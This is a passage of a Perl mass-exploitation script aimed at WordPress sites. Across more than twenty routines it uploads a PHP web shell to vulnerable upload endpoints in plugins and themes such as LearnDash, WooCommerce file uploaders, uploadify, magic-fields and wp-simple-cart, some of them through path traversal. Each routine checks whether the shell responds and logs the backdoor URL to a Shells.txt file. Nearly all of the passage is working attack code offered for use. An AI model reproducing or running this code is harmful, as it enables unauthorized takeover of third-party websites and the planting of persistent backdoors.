print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evolve";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ acf-front #####################
sub acft(){

my $addblockurl = "$site/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [files => ["tool/priv.php"],]);
$addblockup="$site//wp-content/uploads/uigen_'.$year.'/'priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"acf-frontend";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"acf-frontend";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ woocommerce RCE #####################
sub desg(){

my $izo = $site;
if($izo =~ /http:\/\/(.*)\//){ $izo = $1; }
elsif($izo =~ /http:\/\/(.*)/){ $izo = $1; }
elsif($izo =~ /https:\/\/(.*)\//){ $izo = $1; }
elsif($izo =~ /https:\/\/(.*)/){ $izo = $1; }
  
my $addr = inet_ntoa((gethostbyname($izo))[4]);
my $digest = md5_hex($addr);
my $dir = encode_base64('../../../../');
my $file = "tool/priv.php";

my $fuck = $ua->post("$site/wp-content/themes/designfolio-plus/admin/upload-file.php",Content_Type => 'form-data',Content => [ $digest => [$file] ,upload_path => $dir ]);


$dmup="$site/priv.php?c=izo";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"designfolio-plus";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dmup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"designfolio-plus";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ learndash #####################
sub learndash(){
my $url = "$site/";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["tool/dayi.php.php"] ]);

my $check = $ua->get("$site/wp-content/uploads/assignments/dayi.php.")->content;
$dmup="$site/wp-content/uploads/assignments/ms-sitemple.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dmup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ learndash #####################
sub learndashx(){
my $url = "$site/";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["tool/dayicin.php.php"] ]);

$dmup="$site/wp-content/uploads/assignments/dayicin.php.?c=izo";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash2";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dmup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash2";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ learndash #####################
sub learndash2(){
my $url = "$site/";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["tool/priv.php.docx"] ]);


$dmup="$site/wp-content/uploads/assignments/priv.php.docx?c=izo";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash Docx";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dmup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Learndash Docx";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ woocommerce-files #####################
sub wof(){ 
my $url = "$site/wp-admin/admin-ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "action" => "nm_personalizedproduct_upload_file","action" => "upload.php",'file' => ["tool/priv.phtml"] ]);

$zoomerup="$site/wp-content/uploads/product_files/priv.phtml?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wo product_files";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wo product_files";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ woocommerce-post-files #####################
sub wof1(){ 
my $url = "$site/wp-admin/admin-ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "nm_postfront_upload_file","value" => "upload.php",'file' => ["tool/priv.phtml"] ]);

$zoomerup="$site/wp-content/uploads/post_files/priv.phtml?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wo Post Fields";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wo Post Fields";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ Viral Options #####################
sub virald(){

my $addblockurl = "$site/wp-admin/admin-post.php?task=wpmp_upload_previews";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"]]);
$addblockup="$site/wp-content/uploads/wpmp-previews//priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Market Place";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Market Place";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldz(){

my $addblockurl = "$site/wp-content/plugins/uploader/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['folder'=>"/wp-content/uploads", Filedata => ["tool/priv.php"]]);
$addblockup="$site/wp-content/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"uploader Plugin";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"uploader Plugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldzy(){

my $addblockurl = "$site/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"]]);
$addblockup="$site/wp-content/plugins/wp-property/third-party/uploadify/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-property";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp-property";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldzyx(){

my $addblockurl = "$site/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['config_path'=>'../../../../../../', image => ["tool/priv.php"]]);
$addblockup="$site/wp-content/plugins/social-networking-e-commerce-1/images/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"social-network";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"social-network";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldd(){

my $addblockurl = "$site/wp-admin/admin-ajax.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ["action" => "nm_filemanager_upload_file","name" => "upload.php", file => ["tool/priv.php"]]);
$addblockup="$site/wp-content/uploads/user_uploads/upload.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Front end file";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Front end file";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}

################ magic-fields #####################
sub wof2(){ 
my $url = "$site/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["tool/priv.php"] ]);

$zoomerup="$site/wp-content/files_mf/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"magic-fields";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"magic-fields";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ magic-fields #####################
sub custox(){ 
my $url = "$site/wp-content/plugins/custom-background/uploadify/uploadify.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'Filedata' => ["tool/priv.php"],'folder'=>'/wp-content/plugins/custom-background/uploadify/' ]);

$zoomerup="$site/wp-content/plugins/custom-background/uploadify/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"custom-backgr";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"[";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"custom-backgr";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ estatic #####################
sub wof3(){ 
my $url = "$site";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "Import",'importfile' => ["tool/priv.php"] ]);

$zoomerup="$site/wp-content/plugins/ecstatic/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ecstatic Exp";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ecstatic Exp";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ woocommerce-custom-t-shirt-designer #####################
sub tst(){ 
my $url = "$site/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-deep-gray/designit/cs/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["tool/priv.php"] ]);

if ($response->content =~ /(.*?)php/) {
$uploadfolder=$1.'php';
}
$zoomerup="$site/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/$uploadfolder";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"custom-t-shirt";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"custom-t-shirt";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxad(){ 
my $url = "$site/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'Filedata' => ["tool/priv.php"],'folder'=>'/wp-content/themes/qualifire/scripts/admin/uploadify/']);

$zoomerup="$site/wp-content/themes/qualifire/scripts/admin/uploadify/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"qualifireexp";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"qualifireexp";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxnf(){ 
my $url = "$site/wp-content/plugins/boxit/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'Filedata' => ["tool/priv.php"]]);

$zoomerup="$site/wp-content/plugins/boxit/uploads/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"boxit plugin";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"[";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"boxit plugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxzd(){ 
my $url = "$site/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'Filedata' => ["tool/priv.php"]]);

$zoomerup="$site/wp-content/uploads/settingsimages/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ghost themes";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"[";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ghost themes";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxvg(){ 
my $url = "$site/wp-content/themes/Coldfusion/includes/uploadify/upload_settings_image.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'Filedata' => ["tool/priv.php"]]);

$zoomerup="$site/wp-content/uploads/settingsimages/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Coldfusion";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"[";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"[Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Coldfusion";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ ninetofive tema file upload #####################
sub xxcc(){ 
my $url = "$site/wp-content/plugins/wp-simple-cart/request/simple-cart-upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'userfile' => ["tool/priv.php"] ]);

if ($response->content =~ /files(.*?)temporary/) {
$uploadfolder=$1;
}
$zoomerup="$site//wp-content/plugins/wp-simple-cart/files/$uploadfolder/temporary/priv.php?c=izo";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"simple-cartexp";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"simple-cartexp";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ ninetofive tema file upload #####################
sub nineto(){ 
my $url = "$site/wp-content/themes/ninetofive/scripts/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["tool/priv.php"] ]);

if ($response->content =~ /uploads%2F(.*?); expires/) {
$uploadfolder=$1.'?c=izo';
}
$zoomerup="$site/wp-content/themes/ninetofive/scripts/uploads/$uploadfolder";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Ninetofive Exp";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
